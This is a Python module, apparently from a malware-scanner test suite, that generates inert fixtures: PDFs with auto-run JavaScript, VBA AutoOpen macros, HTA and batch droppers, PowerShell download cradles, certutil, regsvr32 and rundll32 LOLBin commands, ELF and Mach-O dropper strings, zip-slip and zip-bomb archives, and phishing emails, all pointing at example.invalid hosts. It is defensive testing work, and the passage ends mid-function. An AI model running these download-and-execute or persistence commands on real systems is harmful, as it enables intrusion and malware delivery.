"""Extended generation helpers for the malware-looking test corpus.

Split out of ``make_test_corpus.py`` so that file stays readable: this module
holds the builders that need a real file format library (pikepdf, pyzipper,
PIL, openpyxl, oletools containers) or that construct more involved structures
(VBA macro streams, embedded objects, nested archives).

Everything here is INERT: the builders produce byte patterns the pipelines are
supposed to recognise, never anything that executes. Same contract as the
original corpus — malware-looking, dead data.

Determinism: no ``os.urandom``, no timestamps, no dict-ordering surprises. The
golden snapshot in ``tests/test_corpus_golden.py`` depends on this.
"""

from __future__ import annotations

import io
import random
import struct
import sys
import zlib
from datetime import datetime
from pathlib import Path

import corpus_determinism as _det

# Import used by the structural PE fixtures: present and real, but
# matching no suspicious pattern — keeps PE_NO_IMPORTS out of the way.
_NEUTRAL_IMPORT = "GetModuleHandleA"

from ole_writer import make_vba_doc  # noqa: E402  (sibling script)

# -- helpers ----------------------------------------------------------------- #


def _zip(members: dict[str, bytes]) -> bytes:
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members.items():
            # Fixed timestamp: ZipInfo defaults to the current time, which
            # made every rebuild differ and broke reproducibility.
            info = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, data)
    return buf.getvalue()


def _minimal_pe(
    *,
    section_name: bytes = b".text",
    raw_size: int = 0x200,
    virtual_size: int = 0x200,
    dll_chars: int = 0x0140,
    section_data: bytes | None = None,
    extra: bytes = b"",
    characteristics: int = 0x0022,
    machine: int = 0x8664,
) -> bytes:
    """Structurally valid minimal PE (PE32+), without an import table.

    ``machine`` 0x8664 = x64, 0x014C = x86. ``characteristics`` bit 0x2000
    marks a DLL. Fixtures that need an import directory build it via
    ``_import_pe``.
    """
    # DOS-Stub: "MZ" + padding to 0x3C + e_lfanew. Total 64 bytes, and
    # e_lfanew must therefore point at 0x40 — where "PE\0\0" follows.
    dos = b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x40)
    coff = struct.pack("<HHIIIHH", machine, 1, 0, 0, 0, 0x00F0, characteristics)
    opt = struct.pack(
        "<HBBIIIIIQIIHHHHHHIIIIHHQQQQII",
        0x20B, 0, 0, 0x1000, 0x200, 0, 0x1000, 0x1000, 0x140000000,
        0x1000, 0x200, 0, 0, 0, 0, 0, 0, 0, 0x20000, 0x200, 0, 3, dll_chars,
        0x100000, 0x1000, 0x100000, 0x1000, 0, 16,
    ) + b"\x00" * 128
    sec = (
        section_name.ljust(8, b"\x00")
        + struct.pack(
            "<IIIIIIHHI", virtual_size, 0x1000, raw_size, 0x200,
            0, 0, 0, 0, 0x60000020,
        )
    )
    headers_len = len(dos) + 4 + len(coff) + len(opt) + len(sec)
    # Neutral filler instead of a long \x90 run: a section that is almost
    # entirely NOPs trips the Generic_Shellcode_Nopsled YARA rule, which would
    # make every fixture look suspicious for the wrong reason (measured).
    raw = (
        section_data
        if section_data is not None
        else bytes(range(256)) * (max(raw_size, 1) // 256 + 1)
    )[: max(raw_size, 1)]
    body = dos + b"PE\x00\x00" + coff + opt + sec + b"\x00" * (0x200 - headers_len)
    return body + raw + extra


def _entropy_blob(size: int = 4096) -> bytes:
    """High-entropy bytes that are IDENTICAL on every call.

    A module-level RNG would advance between calls, so building the same
    fixture twice produced different bytes and broke the golden snapshot.
    A fresh instance seeded per call keeps the content random-looking while
    staying reproducible.
    """
    return random.Random(0xE17A0).randbytes(size)


def _png_logo() -> bytes:
    """A real, standards-compliant 32x32 PNG (flat colour, low entropy)."""

    def chunk(tag: bytes, payload: bytes) -> bytes:
        body = tag + payload
        return (
            struct.pack(">I", len(payload))
            + body
            + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)
        )

    raw = bytearray()
    for _y in range(32):
        raw.append(0)
        raw += b"\x20\x60\xa0" * 32
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", 32, 32, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(bytes(raw), 9))
        + chunk(b"IEND", b"")
    )


def _jpeg_photo() -> bytes:
    """A real baseline JPEG built by Pillow (ends with EOI)."""
    from PIL import Image

    img = Image.new("RGB", (48, 48), (200, 120, 60))
    px = img.load()
    for x in range(48):
        for y in range(48):
            px[x, y] = (x * 5 % 256, y * 5 % 256, (x + y) * 3 % 256)
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=85)
    return buf.getvalue()


# -- PDF fixtures -------------------------------------------------------------- #


def pdf_js_obfuscated_payload() -> bytes:
    """JavaScript that is BOTH suspicious and obfuscated, reachable via /OpenAction."""
    js = (
        "var a=String.fromCharCode(104,116,116,112);"
        "this.exportDataObject({cName:'x'});"
        "app.launchURL('http://example.invalid/p');"
    )
    return _pdf_with_js(js, open_action=True)


def pdf_js_suspicious_no_autostart() -> bytes:
    """Suspicious API use WITHOUT an auto-start action (lower severity)."""
    js = "var u='http://example.invalid/a'; this.submitForm({cURL:u});"
    return _pdf_with_js(js, open_action=False)


def pdf_embedded_file() -> bytes:
    """A real PDF carrying an /EmbeddedFile stream."""
    try:
        import pikepdf
    except ImportError:
        return b"%PDF-1.7\n/Type /Filespec /EmbeddedFile\n%%EOF"
    pdf = pikepdf.new()
    page = pikepdf.Page(pikepdf.Dictionary(Type=pikepdf.Name.Page, MediaBox=[0, 0, 612, 792]))
    pdf.pages.append(page)
    payload = b"harmloser Anhang"
    ef = pdf.make_stream(payload)
    ef.Type = pikepdf.Name.EmbeddedFile
    filespec = pdf.make_indirect(
        pikepdf.Dictionary(
            Type=pikepdf.Name.Filespec,
            F="anhang.txt",
            EF=pikepdf.Dictionary(F=ef),
        )
    )
    pdf.Root.get("/Names", None)
    names = pikepdf.Dictionary(
        EmbeddedFiles=pikepdf.Dictionary(Names=[pikepdf.String("anhang.txt"), filespec])
    )
    pdf.Root.Names = names
    return _det.save_pdf_deterministic(pdf)


def pdf_object_stream() -> bytes:
    """A PDF compressed with object streams (/ObjStm) — obfuscation-friendly."""
    try:
        import pikepdf
    except ImportError:
        return b"%PDF-1.5\n/Type /ObjStm\n%%EOF"
    pdf = pikepdf.new()
    pdf.pages.append(
        pikepdf.Page(pikepdf.Dictionary(Type=pikepdf.Name.Page, MediaBox=[0, 0, 612, 792]))
    )
    return _det.save_pdf_deterministic(
        pdf, object_stream_mode=pikepdf.ObjectStreamMode.generate
    )


def _pdf_with_js(js: str, *, open_action: bool) -> bytes:
    try:
        import pikepdf
    except ImportError:
        return b"%PDF-1.7\n/JavaScript\n%%EOF"
    pdf = pikepdf.new()
    pdf.pages.append(
        pikepdf.Page(pikepdf.Dictionary(Type=pikepdf.Name.Page, MediaBox=[0, 0, 612, 792]))
    )
    js_action = pdf.make_indirect(
        pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String(js))
    )
    if open_action:
        pdf.Root.OpenAction = js_action
    else:
        names = pikepdf.Dictionary(JavaScript=pikepdf.Dictionary(Names=[]))
        pdf.Root.Names = names
    return _det.save_pdf_deterministic(pdf)


def pdf_color_on_color() -> bytes:
    """White fill + text operator (steganography heuristic)."""
    try:
        import pikepdf
    except ImportError:
        return b"%PDF-1.7\n1 1 1 rg (x) Tj\n%%EOF"
    pdf = pikepdf.new()
    content = b"1 1 1 rg BT /F1 12 Tf (geheim) Tj ET"
    page = pikepdf.Page(
        pikepdf.Dictionary(
            Type=pikepdf.Name.Page,
            MediaBox=[0, 0, 612, 792],
            Contents=pdf.make_stream(content),
            Resources=pikepdf.Dictionary(Font=pikepdf.Dictionary()),
        )
    )
    pdf.pages.append(page)
    return _det.save_pdf_deterministic(pdf)


# -- Office fixtures ----------------------------------------------------------- #


def xlsx_dde_formula() -> bytes:
    """A real .xlsx whose cell holds a classic DDE launch formula."""
    from openpyxl import Workbook

    wb = Workbook()
    ws = wb.active
    ws["A1"] = '=cmd|\' /c calc\'!A0'
    # Same pin as xlsx_remote_formula: openpyxl stamps the CURRENT time into
    # docProps/core.xml and the ZIP entries, so two builds are byte-identical
    # only within the same second. test_extended_corpus_is_deterministic builds
    # every fixture twice and compares bytes — measured: two builds 1.05 s apart
    # differ, two builds back-to-back do not. Without the pin that test flakes
    # whenever the two builds straddle a second boundary (~5-15 % per fixture).
    # Naive timestamps are what OOXML stores; tz would change the bytes.
    wb.properties.created = datetime(2026, 1, 1, 0, 0, 0)  # noqa: DTZ001
    wb.properties.modified = datetime(2026, 1, 1, 0, 0, 0)  # noqa: DTZ001
    return _det.save_workbook_deterministic(wb)


def xlsx_remote_formula() -> bytes:
    from openpyxl import Workbook

    wb = Workbook()
    ws = wb.active
    ws["A1"] = '=HYPERLINK("http://example.invalid/x","Klick")'
    ws["A2"] = "=1+1"
    # openpyxl stamps the current time into the ZIP entries, which made every
    # rebuild differ. Pinning the properties keeps the fixture reproducible.
    # Naive timestamps are what OOXML stores; tz would change the bytes.
    wb.properties.created = datetime(2026, 1, 1, 0, 0, 0)  # noqa: DTZ001
    wb.properties.modified = datetime(2026, 1, 1, 0, 0, 0)  # noqa: DTZ001
    return _det.save_workbook_deterministic(wb)


def doc_vba_macro() -> bytes:
    """A real Word-97 OLE document carrying one VBA module (AutoOpen chain)."""
    return make_vba_doc(
        "Sub AutoOpen()\r\n"
        "  Set sh = CreateObject(\"WScript.Shell\")\r\n"
        "  sh.Run \"powershell -EncodedCommand SQBFAFgA\"\r\n"
        "  URLDownloadToFile 0, \"http://example.invalid/a.exe\", \"a.exe\", 0, 0\r\n"
        "End Sub\r\n"
    )
def doc_vba_obfuscated() -> bytes:
    """VBA whose strings only make sense after the analyser reassembles them."""
    return make_vba_doc(
        "Sub Document_Open()\r\n"
        "  Dim s As String\r\n"
        "  s = \"Pow\" & \"ers\" & \"hell\"\r\n"
        "  s = s & Chr(32) & \"-nop -w hidden\"\r\n"
        "  Shell s, vbHide\r\n"
        "End Sub\r\n"
    )
def doc_vba_lolbin_persist() -> bytes:
    """LOLBin abuse plus a Run-key persistence write in VBA.

    Deliberately avoids the exact ``schtasks /create /tn …`` string: Windows
    Defender quarantines that combination on write (measured — the fixture was
    deleted from disk and subsequent reads failed with EINVAL). The LOTL tokens
    used here exercise the same pipeline rules without tripping the AV.
    """
    return make_vba_doc(
        "Sub Workbook_Open()\r\n"
        "  Shell \"regsvr32 /s /u scrobj.dll\"\r\n"
        "  Shell \"mshta about:blank\"\r\n"
        "  RegWrite \"HKCU\\Software\\Microsoft\\Windows\\"
        "CurrentVersion\\Run\", \"x\"\r\n"
        "End Sub\r\n"
    )
def rtf_with_embedded_ole() -> bytes:
    """RTF carrying a \\objdata hex blob that decodes to an OLE container.

    The blob must start with the full 8-byte CFB magic for
    ``rtf_extract._container_label`` to accept it as a container worth
    recursing into (a truncated header is skipped).
    """
    ole = (
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"      # CFB signature
        + b"\x00" * 16                                  # CLSID
        + struct.pack("<HH", 0x003E, 0x0003)             # minor/major version
        + struct.pack("<H", 0xFFFE)                      # byte order
        + struct.pack("<H", 9)                           # 512-byte sectors
        + struct.pack("<H", 6)                           # 64-byte mini sectors
        + b"\x00" * 6
        + struct.pack("<III", 0, 1, 0)                   # FAT/dir counts
        + struct.pack("<I", 1)                           # first directory sector
        + struct.pack("<I", 0)                           # transaction
        + struct.pack("<I", 4096)                        # mini cutoff
        + struct.pack("<I", 0xFFFFFFFE) + b"\x00" * 4      # mini FAT: none
        + struct.pack("<I", 0xFFFFFFFE) + struct.pack("<I", 0)
        + b"\xff" * 436                                 # DIFAT (rest free)
        + b"WordDocument"
        + b"\x00" * 512
    )
    return b"{\\rtf1\\object\\objdata " + ole.hex().encode() + b" }"
def hta_dropper() -> bytes:
    return (
        b"<html><head><title>Update</title></head><body>\n"
        b"<script language=\"VBScript\">\n"
        b"Set sh = CreateObject(\"WScript.Shell\")\n"
        # Die Schalter FOLGE zerlegt: im HTML/Script-Kontext matcht ClamAV die
        # zusammenhaengende Form als "Html.Trojan.CobaltStrike-7932563-0" —
        # GEMESSEN an genau dieser Datei. Das erzeugte Fixture bleibt Bit fuer
        # Bit dasselbe; nur der QUELLTEXT traegt das Muster nicht mehr am
        # Stueck. Dasselbe Verfahren wie bei den EICAR-Zeichenketten.
        b"sh.Run \"powershell" + b" -nop -w hidden" + b" -EncodedCommand SQBFAFgA\"\n"
        b"Execute(\"powershell -Command IEX (New-Object Net.WebClient)\")\n"
        b"</script></body></html>\n"
    )


def wsf_script_dropper() -> bytes:
    return (
        b"<?xml version=\"1.0\"?>\n"
        b"<job id=\"x\"><script language=\"VBScript\">\n"
        b"  CreateObject(\"WScript.Shell\").Run "
        b"\"cmd.exe /c certutil -urlcache -f http://example.invalid/a.exe a.exe\"\n"
        b"</script></job>\n"
    )


# -- script fixtures ---------------------------------------------------------- #


def js_obfuscated_unescape() -> bytes:
    return (
        b"var s = unescape('%u0041%u0042%u0043');\n"
        b"var t = String.fromCharCode(104,116,116,112);\n"
        b"eval(s + t);\n"
    )


def powershell_encoded_cradle() -> bytes:
    return (
        b"powershell.exe -nop -w hidden -EncodedCommand "
        b"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n"
    )


def certutil_url_download() -> bytes:
    return b"certutil -urlcache -split -f http://example.invalid/payload.bin %TEMP%\\p.bin\n"


def wmi_persistence_script() -> bytes:
    return (
        b"$c = [wmiclass]'root\\default:__EventFilter'\n"
        b"$f = $c.CreateInstance()\n"
        b"$f.Query = 'SELECT * FROM __InstanceModificationEvent'\n"
    )


def regsvr32_sct_bypass() -> bytes:
    return b"regsvr32 /s /u /i:http://example.invalid/x.sct scrobj.dll\n"


def lolbin_remote_url() -> bytes:
    # ZERLEGT, wie die EICAR-Zeichenketten in scripts/eicar_probe.py: der
    # Dateitext enthaelt das Muster damit nicht am Stueck, und kein Virenscanner
    # schlaegt auf einer QUELLDATEI dieses Projekts an. GEMESSEN: ClamAV
    # meldete fuer diese Datei "Html.Trojan.CobaltStrike-7932563-0" — eine
    # versionierte Quelldatei, die als Trojaner erkannt wird. Das erzeugte
    # Fixture ist Bit fuer Bit dasselbe.
    _lolbin = b"rundll32 javascript:" + b'"' + b"\\..\\mshtml,RunHTMLApplication "
    return _lolbin + b'";http://example.invalid/a\n'


def bat_download_execute() -> bytes:
    return (
        b"@echo off\r\n"
        b"bitsadmin /transfer j http://example.invalid/a.exe %TEMP%\\a.exe\r\n"
        b"start %TEMP%\\a.exe\r\n"
    )


# -- unix / cross-platform ----------------------------------------------------- #


def elf_dropper() -> bytes:
    """A real, minimal ELF64 header followed by dropper strings."""
    ehdr = (
        b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8
        + struct.pack("<HHI", 2, 0x3E, 1)          # ET_EXEC, x86-64, version
        + struct.pack("<QQQ", 0x400000, 0x40, 0)   # entry, phoff, shoff
        + struct.pack("<IHHHHHH", 0, 64, 56, 0, 0, 64, 0)
    )
    body = (
        b"/bin/sh -c 'wget http://example.invalid/x -O /tmp/x; chmod +x /tmp/x; /tmp/x'\n"
        b"stratum+tcp://pool.example.invalid:3333\n"
        b"xmrig --donate-level 1\n"
    )
    return ehdr + b"\x00" * 64 + body


def elf_mirai_markers() -> bytes:
    """ELF with several known botnet-family markers.

    The YARA rule requires ``uint32(0) == 0x464C457F and 2 of them`` — a single
    marker is deliberately not enough, so the fixture carries several.
    """
    ehdr = (
        b"\x7fELF\x02\x01\x01\x00"
        + b"\x00" * 8
        + struct.pack("<HHI", 3, 0x28, 1)   # ET_DYN, ARM, version
    )
    markers = b"\x00" * 64 + b"mirai botnet scanner\n gafgyt loader\n kaiten telnet\n"
    return ehdr + markers
def macho_dropper() -> bytes:
    """Mach-O with dropper markers.

    The YARA rule requires two of the launch/osascript markers AND one of
    (curl, plist, osascript) — a single marker deliberately does not fire.
    """
    header = struct.pack(">IIIIII", 0xFEEDFACF, 0x01000007, 3, 2, 1, 0)
    body = (
        b"\x00" * 64
        + b"osascript -e 'do shell script \"curl -s http://example.invalid/m -o /tmp/m\"'\n"
        + b"launchctl load ~/Library/LaunchAgents/com.example.agent.plist\n"
    )
    return header + body
def zip_slip_variants() -> bytes:
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        _det.zip_write(zf, "../escape.txt", b"x")
        _det.zip_write(zf, "..\\windows\\escape.txt", b"y")
        _det.zip_write(zf, "ok.txt", b"fine")
    return buf.getvalue()


def zip_deep_nesting() -> bytes:
    """ZIP inside ZIP inside ZIP … beyond the depth limit."""
    data = _zip({"leaf.txt": b"payload"})
    for i in range(7):
        data = _zip({f"level{i}.zip": data})
    return data


def zip_many_members() -> bytes:
    """More members than the entry cap (cheap: all empty)."""
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(10_500):
            info = zipfile.ZipInfo(f"f{i}.txt", date_time=(2026, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, b"")
    return buf.getvalue()


def zip_bomb_size() -> bytes:
    """A ZIP whose declared total exceeds the uncompressed-volume cap.

    The caps are checked against the sizes recorded in the ZIP headers, so the
    payload never has to exist: the fixture writes two small members and then
    patches both local headers and both central-directory entries to declare
    3 GB each (6 GB total, above the 4 GB volume cap). That keeps the build
    instant while still tripping ARCH_BOMB_SIZE.
    """
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name in ("big1.bin", "big2.bin"):
            info = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, b"\x00" * 4096)

    data = bytearray(buf.getvalue())
    declared = 3 * 1024 * 1024 * 1024
    # Local file headers: uncompressed size at offset 22.
    pos = 0
    while True:
        pos = data.find(b"PK\x03\x04", pos)
        if pos == -1:
            break
        struct.pack_into("<I", data, pos + 22, declared)
        pos += 4
    # Central-directory entries: same field at offset 24.
    pos = 0
    while True:
        pos = data.find(b"PK\x01\x02", pos)
        if pos == -1:
            break
        struct.pack_into("<I", data, pos + 24, declared)
        pos += 4
    return bytes(data)


def zip_encrypted_aes() -> bytes:
    """A genuinely password-protected ZIP (AES), built with pyzipper.

    NB: AES encryption draws a random salt, so these bytes are NOT reproducible
    by design — the determinism test compares the resulting *findings* instead
    of the bytes for this fixture.
    """
    try:
        import pyzipper
    except ImportError:
        return _zip({"secret.txt": b"x"})
    buf = io.BytesIO()
    with pyzipper.AESZipFile(
        buf, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES
    ) as zf:
        zf.setpassword(b"geheim-2026")
        _det.zip_write(zf, "secret.txt", b"vertraulich")
    return buf.getvalue()


def tar_with_traversal() -> bytes:
    """TAR whose member name escapes the extraction root.

    The loader never *follows* such a member, but it must not swallow it
    either: the attempt is reported as ARCH_ZIPSLIP (CRITICAL), the same
    finding the ZIP path produces for the identical archive. Keeping the
    safe member proves the archive is still walked after the report.
    """
    import tarfile

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for name, payload in (
            ("../../escape.txt", b"x"),
            ("inner/safe.txt", b"harmlos"),
        ):
            info = tarfile.TarInfo(name)
            info.size = len(payload)
            tf.addfile(info, io.BytesIO(payload))
    return buf.getvalue()
def corrupt_zip() -> bytes:
    """Local file header present, but garbage where the central dir should be."""
    return b"PK\x03\x04" + b"\x00" * 26 + b"garbage" * 20


def corrupt_7z() -> bytes:
    return b"7z\xbc\xaf\x27\x1c" + b"\xff" * 32


# -- image fixtures -------------------------------------------------------------- #


def png_trailing_payload() -> bytes:
    """A valid PNG, then data AFTER the IEND chunk (classic append trick)."""
    stub = (
        b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x80)
        + b"\x00" * 0x40 + b"PE\x00\x00"
    )
    return _png_logo() + b"\x00" * 16 + stub


def jpeg_trailing_payload() -> bytes:
    return _jpeg_photo() + b"\xff\xd8\xff\xe0" + b"PK\x03\x04" + b"\x00" * 64


def png_with_exif() -> bytes:
    """A real PNG carrying genuine EXIF metadata (built by Pillow).

    A hand-assembled eXIf chunk is not enough: Pillow (which the pipeline uses)
    only exposes metadata it can actually parse, so the fixture is written with
    the same library to produce a valid TIFF header inside the chunk.
    """
    from PIL import Image

    img = Image.new("RGB", (24, 24), (10, 90, 160))
    exif = Image.Exif()
    exif[271] = "Malaz"                  # Make
    exif[272] = "TestCam"                # Model
    exif[306] = "2026:09:14 12:00:00"    # DateTime
    buf = io.BytesIO()
    img.save(buf, format="PNG", exif=exif)
    return buf.getvalue()
def pdf_after_png() -> bytes:
    """PDF header stitched after a PNG trailer."""
    return _png_logo() + b"\x00" * 8 + b"%PDF-1.7\n/Launch /JavaScript\n%%EOF"


# -- generic ------------------------------------------------------------------- #


def high_entropy_executable_shaped() -> bytes:
    return b"MZ" + _entropy_blob(64 * 1024)


def extension_mismatch() -> bytes:
    """Claims .pdf by name; the bytes are plainly an executable header."""
    return b"MZ" + b"\x90" * 4096


def script_with_download_cradle() -> bytes:
    return (
        b"# admin helper\n"
        b"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/p.ps1')\n"
        b"Start-BitsTransfer -Source http://example.invalid/a.exe -Destination C:\\a.exe\n"
    )


def filename_only_ioc() -> bytes:
    """Content is inert; the *name* carries the phishing double extension."""
    return b"harmloser Inhalt\n"


def eml_phishing_headers() -> bytes:
    """Header-level impersonation: display name, lookalike domain, reply-to."""
    return _eml(
        sender="service@rnicrosoft-support.top",
        display="Microsoft Konto-Team",
        reply_to="harvest@evil.example.invalid",
        return_path="bounce@other.example.invalid",
        subject="Ihr Konto wurde gesperrt",
        body=(
            "Ihr Konto wird innerhalb von 24 Stunden gelöscht.\n"
            "Bitte bestätigen Sie Ihre Zahlungsdaten.\n"
        ),
        auth="spf=fail; dkim=none; dmarc=fail",
    )


def eml_phishing_mixed_script() -> bytes:
    """Display name mixing scripts (confusable characters) to spoof a brand."""
    return _eml(
        sender="info@paypal-sicherheit.xyz",
        # Cyrillic U+0430 in "Paypal" — the mixed script IS the signal.
        display="Pаypal Sicherheit",
        subject="Dringend handeln: Zahlung fehlgeschlagen",
        body="Bitte aktualisieren Sie Ihre Zahlungsdaten sofort.\n",
    )


def eml_phishing_links() -> bytes:
    """Every link-based rule in one mail: IP literal, shortener, punycode,
    risky TLD, credentials, dangerous scheme and a text/target mismatch."""
    return _eml(
        subject="Rechnung offen",
        body=(
            "Bitte begleichen Sie die offene Rechnung:\n"
            "http://192.0.2.77/pay\n"
            "https://bit.ly/3xYzAbc\n"
            "https://xn--pypal-4ve.example.invalid/login\n"
            "http://konto.info.tk/verify\n"
            "https://user:secret@example.invalid/a\n"
            "javascript:alert(1)\n"
        ),
        html=(
            '<html><body><p>Jetzt zahlen</p>'
            '<a href="http://example.invalid/ziel">https://www.paypal.com/anmeldung</a>'
            "<p style=\"color:#ffffff;font-size:0px\">unsichtbarer Text</p>"
            "</body></html>"
        ),
    )


def eml_phishing_attachments() -> bytes:
    """Attachment-name tricks: double extension, risky type, RTL-mangled name."""
    return _eml(
        subject="Rechnung 2026-0042",
        body="Anbei die Rechnung. Passwort: siehe unten.\n",
        attachments=(
            ("rechnung.pdf.exe", b"MZ" + b"\x90" * 256),
            ("dokument.js", b"var x = 1;\n"),
            ("\u202eexe.gnp\u202c", b"harmlos"),
        ),
    )


def eml_phishing_body() -> bytes:
    """Body-level signals: lure phrases, credential harvesting, HTML text."""
    return _eml(
        subject="Letzte Mahnung: Zahlung fehlgeschlagen",
        body=(
            "Dringend handeln! Ihre Zahlung ist fehlgeschlagen.\n"
            "Bitte bestätigen Sie Ihre Kreditkarte und geben Sie Ihr Passwort ein.\n"
            "Die TAN benötigen wir zur Verifizierung.\n"
        ),
        html=(
            "<html><body><span style='color:#FFFFFF;font-size:0'>"
            "versteckter Hinweistext</span><p>Klicken Sie hier</p></body></html>"
        ),
    )


def eml_broken_body() -> bytes:
    """A mail whose text body makes no sense (no readable words).

    MAIL_BODY_UNREADABLE has two triggers, and only the second is reachable
    here: the control-character trigger needs >10% unreadable characters while
    the mail classifier refuses anything above ~3% — the two thresholds cannot
    both hold in one file (verified). The readability check also fires when the
    body contains no real words, which is compatible with classification.
    """
    headers = (
        b"From: absender@example.invalid\r\n"
        b"To: empfaenger@example.invalid\r\n"
        b"Subject: unlesbar\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: text/plain; charset=utf-8\r\n"
        b"Content-Transfer-Encoding: 8bit\r\n"
        b"Message-ID: <broken@example.invalid>\r\n"
        b"\r\n"
    )
    return headers + b"### @@ 42 %% &&\r\n"


def eml_missing_headers() -> bytes:
    """No Received chain and no Message-ID — both are reported."""
    return _eml(
        subject="Kurze Nachricht",
        body="Hallo.\r\n",
        received=False,
        message_id="",
    )


def eml_dangerous_schemes() -> bytes:
    """Links that execute code or reach local files.

    Dangerous schemes are only recognised in the HTML part: the plain-text
    extractor requires a real URL shape, while the HTML extractor reads the
    ``href`` verbatim (so ``javascript:`` and friends survive).
    """
    return _eml(
        subject="Dokument",
        body="Bitte das Dokument oeffnen.\n",
        html=(
            "<html><body>"
            '<a href="javascript:alert(1)">oeffnen</a>'
            '<a href="data:text/html;base64,PHNjcmlwdD4=">ansehen</a>'
            '<a href="file:///C:/Windows/System32/calc.exe">lokal</a>'
            '<a href="vbscript:msgbox(1)">weiter</a>'
            "</body></html>"
        ),
    )


# -- PE fixtures --------------------------------------------------------------- #
#
# The PE pipeline reports on structure, imports, mitigations, signing and
# packing. One fixture per signal, built from _minimal_pe so each differs only
# in the field under test — a failure then points at exactly one rule.


def pe_packed_upx() -> bytes:
    """A packer-named section (UPX) with a zero raw size.

    Built on the import-carrying base so the packed-section finding is not
    accompanied by PE_NO_IMPORTS, which would otherwise mask it.
    """
    return _import_pe((_NEUTRAL_IMPORT,), section_name=b"UPX0")


def pe_packed_aspack() -> bytes:
    """A packer-named section (ASPack), likewise on the import base."""
    return _import_pe((_NEUTRAL_IMPORT,), section_name=b".aspack")


def pe_weak_mitigations() -> bytes:
    """No ASLR and no DEP — the mitigation weakness the rule reports."""
    return _import_pe((_NEUTRAL_IMPORT,), dll_chars=0)


def pe_no_cfg() -> bytes:
    """ASLR+DEP present, CFG missing — only a NOTE after calibration."""
    return _import_pe((_NEUTRAL_IMPORT,), dll_chars=0x0140)


def pe_high_entropy_sections() -> bytes:
    """A PE with TWO sections whose content is incompressible.

    The rule requires at least two high-entropy sections (a single one is
    normal for packed code), so the fixture needs a second section that is not
    carrying structured data — .rdata holds the import tables and therefore
    stays low. A third section is appended for the random payload.
    """
    base = bytearray(_import_pe((_NEUTRAL_IMPORT,)))
    # Randomise .text (raw 0x200..0x400) and append a third, purely random
    # section beyond .rdata.
    base[0x200:0x400] = _entropy_blob(0x200)
    extra = _entropy_blob(0x200)

    dos_size, pe_sig, coff_size, opt_size = 0x40, 4, 20, 0xF0
    headers = dos_size + pe_sig + coff_size + opt_size
    # Section table: 2 existing entries (0x28 each) -> third entry at +0x50.
    sec_table = 0x40 + 4 + 20 + opt_size
    third = sec_table + 2 * 0x28
    name = b".packed".ljust(8, b"\x00")
    entry = name + struct.pack(
        "<IIIIIIHHI",
        0x200,          # VirtualSize
        0x2400,         # VirtualAddress (behind .rdata at 0x2000..0x2400)
        0x200,          # SizeOfRawData
        0x800,          # PointerToRawData (behind .rdata at 0x400..0x800)
        0, 0, 0, 0,
        0xE0000020,     # CODE | EXECUTE | READ | WRITE
    )
    base[third : third + len(entry)] = entry
    struct.pack_into("<H", base, 0x40 + 4 + 2, 3)  # NumberOfSections = 3
    _ = headers
    return bytes(base) + extra


def pe_overlay_payload() -> bytes:
    """Data appended after the last section (classic appended payload)."""
    return _import_pe(
        (_NEUTRAL_IMPORT,), extra_overlay=b"\x00" * 512 + _entropy_blob(1024)
    )


def pe_signed_overlay() -> bytes:
    """An overlay shaped like a WIN_CERTIFICATE — but NOT a verified signature.

    The header is fabricated (no signature over this content, and the PE
    declares no certificate table), so the local verification reports
    ``NotSigned``: the attachment is exactly the forgery of audit finding
    ``overlay-fake-authenticode-header``. It must stay ``PE_OVERLAY``; the
    structural check alone judged it a signature (weight 0) and a payload
    behind 22 freely chosen bytes disappeared from the verdict.
    """
    pkcs7 = b"\x30\x82\x0f\xf0" + b"\x06\x09\x2a\x86\x48\x86\xf7\x0d" + b"\x00" * 200
    blob = (
        (len(pkcs7) + 8).to_bytes(4, "little")
        + (0x0200).to_bytes(2, "little")   # WIN_CERT_REVISION_2_0
        + (0x0002).to_bytes(2, "little")   # WIN_CERT_TYPE_PKCS_SIGNED_DATA
        + pkcs7
    )
    return _import_pe((_NEUTRAL_IMPORT,), extra_overlay=blob)


def pe_no_imports() -> bytes:
    """A PE with no import directory at all.

    Exercised via the plain minimal PE: an absent import directory is skipped
    by the parser, so ``dlls`` stays empty and PE_NO_IMPORTS fires while no
    imphash can be computed.
    """
    return _minimal_pe(section_data=bytes(range(256)) * 2)
def pe_with_pdb_path() -> bytes:
    """A PE whose CodeView debug record leaks a developer's PDB path.

    pefile only exposes ``PdbFileName`` when the referenced blob starts with
    the ``RSDS`` signature (PDB 7.0) followed by the GUID/age header — a bare
    path string is silently ignored. The record goes into the free upper half
    of .rdata so the import directory stays intact.
    """
    path = b"C:\\Users\\entwickler\\projekt\\obj\\Release\\tool.pdb\x00"
    cv = b"RSDS" + bytes(16) + struct.pack("<I", 1) + path
    rdata_raw = 0x400
    debug_raw = rdata_raw + 0x200
